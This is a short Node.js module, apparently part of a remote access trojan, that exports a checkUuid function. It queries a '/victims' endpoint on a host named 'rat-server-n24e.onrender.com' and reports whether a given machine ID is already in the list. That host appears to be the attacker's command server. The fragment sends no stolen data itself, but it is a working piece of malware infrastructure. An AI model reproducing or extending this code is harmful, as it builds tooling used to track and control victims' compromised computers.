const axios = require(`axios`).default

async function checkUuid(uuid){
    var allUuids = await axios.get(`https://rat-server-n24e.onrender.com/victims`)
    var victims = allUuids.data
    let t = [];
    victims.forEach((e) => {
      if (e == uuid) {
        t.push(e);
      }
    });
    if(t[0]==uuid){
        return true
    }else{
        return false
    }
}

module.exports = checkUuid